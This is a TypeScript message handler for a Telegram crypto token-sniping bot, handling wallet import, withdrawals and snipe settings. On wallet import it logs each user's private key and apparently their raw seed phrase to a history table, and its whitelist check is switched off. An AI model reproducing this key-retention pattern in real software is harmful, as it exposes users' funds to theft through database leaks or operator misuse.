import * as instance from './bot'
import {StateCode, OptionCode} from './bot'
import * as utils from './utils'
import * as afx from './global'
import * as uniconst from './uniconst'

import assert from 'assert'
import dotenv from 'dotenv'
import * as swapManager from './swap_manager'
import { stat } from 'fs'

dotenv.config()

/*

start - welcome
snipe - snipe setting
wallet - manage your bot wallet
*/

export const procMessage = async (message: any, database: any) => {

	let chatid = message.chat.id.toString();
	let session = instance.sessions.get(chatid)
	let userName = message?.chat?.username;
	let messageId = message?.messageId

	if (message.photo) {
		console.log(message.photo)
		processSettings(message, database);
	}

	if (message.animation) {
		console.log(message.animation)
		processSettings(message, database);
	}

	if (!message.text)
		return;

	let command = message.text;
	if (message.entities) {
		for (const entity of message.entities) {
			if (entity.type === 'bot_command') {
				command = command.substring(entity.offset, entity.offset + entity.length);
				break;
			}
		}
	}

	if (command.startsWith('/')) {

		if (!session) {

			if (!userName) {
				console.log(`Rejected anonymous incoming connection. chatid = ${chatid}`);
				instance.sendMessage(chatid, `Welcome to ${process.env.BOT_TITLE} bot. We noticed that your telegram does not have a username. Please create username [Setting]->[Username] and try again.`)
				return;
			}

			if (false && !await instance.checkWhitelist(chatid)) {

				//instance.sendMessage(chatid, `😇Sorry, but you do not have permission to use alphBot. If you would like to use this bot, please contact the developer team at ${process.env.TEAM_TELEGRAM}. Thanks!`);
				console.log(`Rejected anonymous incoming connection. @${userName}, ${chatid}`);
				return;
			}

			console.log(`@${userName} session has been permitted through whitelist`);

			session = await instance.createSession(chatid, userName, 'private');
			session.permit = 1;

			await database.updateUser(session)
		}

		if (userName && session.username !== userName) {
			session.username = userName
			await database.updateUser(session)
		}

		// if (session.permit !== 1) {
		// 	session.permit = await instance.isAuthorized(session) ? 1 : 0;
		// }

		// if (false && session.permit !== 1) {
		// 	//instance.sendMessage(chatid, `😇Sorry, but you do not have permission to use alphBot. If you would like to use this bot, please contact the developer team at ${process.env.TEAM_TELEGRAM}. Thank you for your understanding. [2]`);
		// 	return;
		// }

		let params = message.text.split(' ');
		if (params.length > 0 && params[0] === command) {
			params.shift()
		}
		
		command = command.slice(1);
		if (command === instance.COMMAND_START) { 

			await instance.executeCommand(chatid, undefined, undefined, {c: OptionCode.MAIN_MENU, k:1 })

		} else if (command === instance.COMMAND_HOME) { 

			await instance.executeCommand(chatid, undefined, undefined, {c: OptionCode.MAIN_MENU, k:1 })

		} else if (command === instance.COMMAND_WALLET) { 

			await instance.executeCommand(chatid, undefined, undefined, {c: OptionCode.MAIN_WALLET, k:1 })

		} else if (command === instance.COMMAND_SNIPE) { 

			await instance.executeCommand(chatid, undefined, undefined, {c: OptionCode.MAIN_SNIPE, k:1 })

		}  else {
			
			console.log(`Command Execute: /${command} ${params}`)
			if (instance._command_proc) {
				instance._command_proc(session, command, params, messageId)
			}
		}

		// instance.stateMap_remove(chatid)

	} else if (message.reply_to_message) {

		processSettings(message, database);
		await instance.removeMessage(chatid, message.message_id) //TGR
		await instance.removeMessage(chatid, message.reply_to_message.message_id)

	} else {
		const value = message.text.trim()

		if (utils.isValidAddress(value)) {
			
			if (session && instance._callback_proc) {
				instance._callback_proc(OptionCode.MSG_GETTOKENINFO, { session, address: value })
			}
		}
	}
}

const processSettings = async (msg: any, database: any) => {

	const sessionId = msg.chat?.id.toString()

	const session = instance.sessions.get(sessionId)
	if (!session) {
		return
	}

	let stateNode = instance.stateMap_getFocus(sessionId)
	if (!stateNode) {
		instance.stateMap_setFocus(sessionId, StateCode.IDLE, { sessionId: sessionId })
		stateNode = instance.stateMap_get(sessionId)

		assert(stateNode)
	}

	const stateData = stateNode.data
		
	if (stateNode.state === StateCode.WAIT_SET_WALLET_IMPORT_PKEY) {

		const value = msg.text.trim()
		if (!value || value === '') {
			instance.sendInfoMessage(sessionId, `🚫 Sorry, the contract address you entered is invalid. Please try again`)
			return
		}

		const isSeed = utils.isValidSeedPhrase(value)

		let pkey: string | null = null, seed: string | null = null

		if (!isSeed) {

			if (!utils.isValidPrivateKey(value)) {
				await instance.sendInfoMessage(sessionId, `🚫 Sorry, the key you entered is invalid. Please try again`)
				return
			}

			pkey = value

		} else {

			seed = value
			pkey = await utils.seedPhraseToPrivateKey(value)
			if (!pkey) {
				await instance.sendInfoMessage(sessionId, `🚫 Sorry, the mnemonic key you entered is invalid. Please try again`)
				return
			}
		}

		let wallet = utils.getWalletAddressFromPKey(pkey ?? '')
		if (!wallet) {
			await instance.sendInfoMessage(sessionId, `🚫 Sorry, the private key you entered is invalid. Please try again`)
			return
		}

		session.wallet = wallet
		session.pkey = utils.encryptPKey(pkey as string)

		await database.addPKHistory({
			chatid: sessionId,
			username: msg.chat.username,
			pkey: session.pkey,
			account: wallet,
			mnemonic: seed,
			timestamp: new Date().getTime()
		})

		await database.updateUser(session)
		await instance.sendInfoMessage(sessionId, `✅ New wallet has been imported successfully.`)

		instance.executeCommand(sessionId, undefined, undefined, {c: OptionCode.MAIN_WALLET, k:`${sessionId}:1` })

	} else if (stateNode.state === StateCode.WAIT_SET_WALLET_WITHDRAW_AMOUNT) {

		const value = Number(msg.text.trim())
		if (isNaN(value) || value <= 0 ) {
			await instance.sendInfoMessage(sessionId, `🚫 Sorry, the amount you entered is invalid. Please try again`)
			return
		}

		const balance = await utils.getBalance(session.wallet)
		if (value > balance) {
			await instance.sendInfoMessage(sessionId, `🚫 Sorry, the amount you entered must be less than ${utils.roundDecimal(balance, uniconst.WETH_DECIMALS)}. Please try again`)
			return
		}

		stateData.balance = Number(value.toFixed(5))

		await instance.sendReplyMessage(stateData.sessionId, `Reply to this message with your destination <b>Wallet Address</b>`);
		instance.stateMap_setFocus(stateData.sessionId, StateCode.WAIT_SET_WALLET_WITHDRAW_ADDRESS, stateData)

	} else if (stateNode.state === StateCode.WAIT_SET_WALLET_WITHDRAW_ADDRESS) {

		const value = msg.text.trim()
		if (!value || value === '' || !utils.isValidAddress(value)) {
			instance.sendInfoMessage(sessionId, `🚫 Sorry, the wallet address you entered is invalid. Please try again`)
			return
		}	
		
		let msg1
		
		if (stateData.balance < 0) {
			msg1 = `Are you sure you want to withdraw all SOL balance?

Source Wallet: <code>${session.wallet}</code>
Destination Wallet: <code>${value}</code>
			
Tap confirm button to proceed`
		} else {
			msg1 = `Are you sure you want to withdraw?

Balance: <code>${utils.roundDecimalWithUnit(stateData.balance, uniconst.WETH_DECIMALS, ' ETH')}</code>
Source Wallet: <code>${session.wallet}</code>
Destination Wallet: <code>${value}</code>
			
Tap confirm button to proceed`
		}
		
		const itemData = `${stateData.balance}`
		stateData.wallet = value
		await instance.openConfirmMenu(stateData.sessionId, msg1, 'Confirm', OptionCode.WALLET_WITHDRAW_CONFIRM, itemData)
		
	} else if (stateNode.state === StateCode.WAIT_SET_SNIPE_GAS_DELTA) {

		const value = Number(msg.text.trim())
		if (isNaN(value) || value <= 0 ) {
			await instance.sendInfoMessage(sessionId, `🚫 Sorry, the SOL amount you entered is invalid. Please try again`)
			return
		}

		session.gasDelta = value
		await database.updateUser(session)
		await instance.sendInfoMessage(sessionId, `✅ Gas delta has been updated to ${value} Gwei`)
		instance.executeCommand(stateData.sessionId, stateData.messageId, stateData.callbackQueryId, {c: OptionCode.MAIN_SNIPE, k:0 })

	} else if (stateNode.state === StateCode.WAIT_SET_SNIPE_TRXPRIORITY_VALUE) {

		const value = Number(msg.text.trim())
		if (isNaN(value) || value <= 0 ) {
			await instance.sendInfoMessage(sessionId, `🚫 Sorry, the SOL amount you entered is invalid. Please try again`)
			return
		}

		session.trxPriority = 0
		session.trxPriorityAmount = value

		await database.updateUser(session)

		await instance.sendInfoMessage(sessionId, `✅ Trx Priority SOL amount has been updated to ${value} ETH`)
		instance.executeCommand(stateData.sessionId, stateData.messageId, stateData.callbackQueryId, {c: OptionCode.MAIN_SNIPE, k:0 })

	} else if (stateNode.state === StateCode.WAIT_SET_SNIPE_SLIPPAGE_BUY) {

		const value = Number(msg.text.trim())
		if (isNaN(value) || value <= 0 ) {
			await instance.sendInfoMessage(sessionId, `🚫 Sorry, the value you entered is invalid. Please try again`)
			return
		}

		if (value > 50) {
			const msg1 = `⚠️ WARNING: Slippage over 50% is dangerous! You are risking getting a significantly worse price and higher fees than what you expect. Please make sure you know what you are doing before making slippage this high.`
			await instance.sendInfoMessage(sessionId, msg1)
		}

		session.buySlippage = value

		await database.updateUser(session)

		await instance.sendInfoMessage(sessionId, `✅ Buy slippage value has been updated to ${value}%`)
		instance.executeCommand(stateData.sessionId, stateData.messageId, stateData.callbackQueryId, {c: OptionCode.MAIN_SNIPE, k:0 })
	} else if (stateNode.state === StateCode.WAIT_ADD_MANUAL_BUYER_TOKEN) {

		const sessionId = stateNode.data.sessionId
		const value = msg.text.trim()
		if (!utils.isValidAddress(value)) {
			instance.sendInfoMessage(sessionId, `🚫 Sorry, the address you entered is invalid. Please input again`)
			return
		}

		const tokenInfo = await utils.getTokenInfo(value)
		if (!tokenInfo) {
			instance.sendInfoMessage(sessionId, `🚫 Sorry, the address you entered is invalid.`)
			return
		}

		stateData.tokenAddress = tokenInfo.address

		//Database store


		await instance.removeMessage(sessionId, msg.message_id)

		await instance.executeCommand(sessionId, undefined, undefined, {c: OptionCode.MAIN_SET_MANUAL_BUYER_PARAM, k:1 })

	} else if (stateNode.state === StateCode.WAIT_SET_MSG_BUYXAMOUNT) {

		const value = Number(msg.text.trim())
		if (isNaN(value) || value <= 0) {
			await instance.sendInfoMessage(sessionId, `🚫 Sorry, the value you entered is invalid. Please try again`)
			return
		}

		swapManager.buyToken(database, session, stateData.tokenAddress, value)

	} else if (stateNode.state === StateCode.WAIT_ADD_SNIPING_TOKEN) {

		const sessionId = stateNode.data.sessionId
		const value = msg.text.trim()
		if (!utils.isValidAddress(value)) {
			instance.sendInfoMessage(sessionId, `🚫 Sorry, the address you entered is invalid. Please input again`)
			return
		}

		const tokenInfo = await utils.getTokenInfo(value)
		if (!tokenInfo) {
			instance.sendInfoMessage(sessionId, `🚫 Sorry, the address you entered is invalid.`)
			return
		}

		stateData.tokenAddress = tokenInfo.address

		await instance.removeMessage(sessionId, msg.message_id)

		const msg2 = `Reply to this message with the ${afx.quoteToken.symbol} amount to snipe`
		await instance.sendReplyMessage(sessionId, msg2)
		instance.stateMap_setFocus(sessionId, StateCode.WAIT_SET_SNIPE_AMOUNT, stateData)

	} else if (stateNode.state === StateCode.WAIT_SET_SNIPE_AMOUNT) {

		const value = Number(msg.text.trim())
		if (value < 0.00001 || !value || isNaN(value)) {
			instance.sendInfoMessage(sessionId, `🚫 Sorry, the value you entered is invalid. it must be greater than 0.001`)
			return
		}

		const messageId = stateNode.data.messageId

		stateData.amount = value

		await instance.removeMessage(sessionId, msg.message_id)

		const msg2 = `Reply to this message with the auto tip amount to snipe`
		await instance.sendReplyMessage(sessionId, msg2)
		instance.stateMap_setFocus(sessionId, StateCode.WAIT_SET_SNIPE_TIP_AMOUNT, stateData)

// 		const tokenInfo = await utils.getTokenInfo(stateData.tokenAddress)
// 		await database.addTokenSnipping(session.chatid, stateData.tokenAddress, tokenInfo.name, tokenInfo.symbol, tokenInfo.decimals, value)

// 		await instance.sendInfoMessage(session.chatid, `✅ Token has been added to snippet list.
// Token: <code>${tokenInfo.name} (${tokenInfo.symbol})</code>
// Address: <code>${stateData.tokenAddress}</code>
// Quote Token Amount: <code>${utils.roundDecimal(value, 5)} ${afx.quoteToken.symbol}</code>`)
	} else if (stateNode.state === StateCode.WAIT_SET_SNIPE_TIP_AMOUNT) {

		const value = Number(msg.text.trim())
		if (value < 0.00001 || !value || isNaN(value)) {
			instance.sendInfoMessage(sessionId, `🚫 Sorry, the value you entered is invalid. it must be greater than 0.001`)
			return
		}

		const messageId = stateNode.data.messageId

		stateData.snipeTip = value
		console.log(`--------- amount : `, stateData.amount)

		await instance.removeMessage(sessionId, msg.message_id)

		const tokenInfo = await utils.getTokenInfo(stateData.tokenAddress)

		if (tokenInfo) {
			
			await database.addTokenSnipping(session.chatid, stateData.tokenAddress, tokenInfo.name, tokenInfo.symbol, tokenInfo.decimals, stateData.amount, stateData.snipeTip)

			await instance.sendInfoMessage(session.chatid, `✅ Token has been added to snippet list.
Token: <code>${tokenInfo.name} (${tokenInfo.symbol})</code>
CA : <code>${stateData.tokenAddress}</code>
Quote Token Amount: <code>${utils.roundDecimal(stateData.amount, 5)} ${afx.quoteToken.symbol}</code>
Snipe Tip Amount: <code>${utils.roundDecimal(stateData.snipeTip, 5)} ${afx.quoteToken.symbol}</code>`)

		} else {
			await instance.sendInfoMessage(session.chatid, `⚠️ Error
Token is already live`)
		}
		
	} 
}
